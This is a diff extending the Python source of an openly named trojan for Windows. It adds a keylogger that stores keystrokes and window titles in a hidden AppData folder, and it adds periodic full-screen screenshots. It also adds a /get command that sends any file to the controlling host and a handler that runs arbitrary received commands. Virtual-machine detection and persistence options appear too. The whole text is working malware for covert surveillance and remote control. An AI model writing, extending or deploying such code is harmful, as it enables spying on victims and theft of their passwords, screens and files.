@@ -10,26 +10,59 @@ import ctypes as c
 from pynput import keyboard as kb
 from win32gui import GetWindowText, GetForegroundWindow
 import pyautogui as pg
+from PIL import ImageGrab as Ig
+from datetime import datetime
 
 
 class KeyLogger:
     def __init__(self, auto_screenshot=False, time_screenshot=5):
+        try:
+            wd = os.path.join(os.fspath(subprocess.check_output("echo %APPDATA%", shell=True).decode().replace('\r\n', '')), 'KeyBoard')
+        except Exception as e:
+            print(e)
+            wd = os.getcwd()
         self.last_window = None
         self.auto_screenshot = auto_screenshot
         self.time_screenshot = time_screenshot
         self.screenshot_thread = threading.Thread(target=self.exec_auto_screenshot, daemon=True)
+        self.working_dir = wd
+
+        self.generate_workdir()
 
         if self.auto_screenshot:
             self.screenshot_thread.start()
 
-        with kb.Listener(on_press=lambda _: self.press()) as listner:
+        self.listener = threading.Thread(target=self.listen, daemon=True)
+        self.listener.start()
+
+    def listen(self):
+        with kb.Listener(on_press=lambda key: self.press(key)) as listner:
             listner.join()
 
-    def press(self):
+    def generate_workdir(self):
+        try:
+            os.mkdir(self.working_dir)
+        except FileExistsError:
+            pass
+        except Exception as e:
+            print(e)
+            return False
+
+        try:
+            os.mkdir(os.path.join(self.working_dir, 'prints'))
+        except FileExistsError:
+            pass
+        except Exception as e:
+            print(e)
+            return False
+
+        return True
+
+    def press(self, key):
         window = GetWindowText(GetForegroundWindow())
         if window != self.last_window:
             self.last_window = window
-            with open('keyboard.log', 'a') as f:
+            with open(os.path.join(self.working_dir, 'keyboard.log'), 'a') as f:
                 f.write(f"\n #### {window} - {datetime.now().strftime('%d/%m/%Y %H:%M:%S')} #### \n")
 
         if hasattr(key, 'char'):
@@ -45,8 +78,9 @@ class KeyLogger:
         else:
             value = str(key)
 
-        with open('keyboard.log', 'a') as f:
-            f.write(value)
+        with open(os.path.join(self.working_dir, 'keyboard.log'), 'a') as f:
+            if value:
+                f.write(value)
 
     def exec_auto_screenshot(self):
         if self.time_screenshot < 5:
@@ -55,17 +89,19 @@ class KeyLogger:
         while self.auto_screenshot:
             time.sleep(self.time_screenshot)
             filename = f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png"
-            path = os.path.join(os.path.join(os.getcwd(), 'prints'))
-            screen = pyautogui.screenshot()
+            path = os.path.join(self.working_dir, 'prints')
+            screen = Ig.grab(all_screens=True)
             screen.save(os.path.join(path, filename))
 
-    def screenshot(self):
-        pass
+    def screenshot(self, filename):
+        path = os.path.join(self.working_dir, 'prints')
+        screen = Ig.grab(all_screens=True)
+        screen.save(os.path.join(path, filename))
 
 
 class Trojan:
     try:
-        import compiler_config as comp
+        import config.compiler_config as comp
 
         HOST = comp.HOST
         PORT = comp.PORT
@@ -76,6 +112,7 @@ class Trojan:
         AUTO_SCREENSHOT = comp.AUTO_SCREENSHOT
         TIME_SCREENSHOT = comp.TIME_SCREENSHOT
     except (ImportError, AttributeError) as e:
+        print(e)
         HOST = "127.0.0.1"
         PORT = 469
         ACTIVATE = True
@@ -138,7 +175,7 @@ class Trojan:
         self.is_vm = False
         if self.try_detect_vm:
             vm_vendors = ["VMware", "VirtualBox", "Virtual", "Microsoft Corporation", "Hyper-V", "QEMU", "KVM"]
-            output = subprocess.check_output("wmic baseboard get product").decode().lower()
+            output = subprocess.check_output("wmic baseboard get product", shell=True).decode().lower()
             print(output)
 
             for vendor in vm_vendors:
@@ -163,20 +200,54 @@ class Trojan:
         try:
             while True:
                 data = self.client.recv(1024).decode().strip()
-                print(data)
-                if data == "/exit":
-                    self.client.close()
+                if not data:
                     break
+                elif data == "/exit":
+                    self.client.close()
+                    sys.exit()
                 elif data == "/print":
-                    pass
+                    t = threading.Thread(target=self.print, daemon=True)
+                    t.start()
+                    t.join()
+                elif data.startswith("/get "):
+                    data = data.rsplit(" ", 1)
+                    if len(data) == 2:
+                        t = threading.Thread(target=self.send_file, args=(data[1],), daemon=True)
+                        t.start()
+                        t.join()
                 else:
-                    t = threading.Thread(target=self.cmd, args=(data,))
+                    t = threading.Thread(target=self.cmd, args=(data,), daemon=True)
                     t.start()
                     t.join()
         except Exception as error:
             print("Error listen", error)
             if self.client:
                 self.client.close()
+
+    def send_file(self, file_path):
+        try:
+            with open(file_path, 'rb') as file:
+                file_data = file.read()
+        except FileNotFoundError:
+            file_data = b''
+
+        try:
+            self.client.send(f"{len(file_data)}".encode())
+            if not file_data:
+                self.client.send("File Not Found".encode())
+            else:
+                self.client.send(file_data)
+        except Exception as error:
+            print("Error file", error)
+
+    def print(self):
+        filename = f"exec_screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png"
+        self.keylogger.screenshot(filename)
+        try:
+            prints_path = os.path.join(self.keylogger.working_dir, 'prints')
+            self.client.send(f"{os.path.join(prints_path, filename)}\n".encode())
+        except Exception as error:
+            print("Error print", error)
 
     def cmd(self, data):
         try:
@@ -205,7 +276,5 @@ class Trojan:
 
 if __name__ == "__main__":
     trojan = Trojan()
-
     c.windll.user32.MessageBoxW(0, f"HOST: {trojan.HOST}, PORT: {trojan.PORT}, ACTIVATE: {trojan.ACTIVATE}, PERSIST: {trojan.PERSIST}, ADMIN: {trojan.ADMIN}, DETECT_VM: {trojan.DETECT_VM}, is_vm: {trojan.is_vm}", "types")
-
     trojan.run()
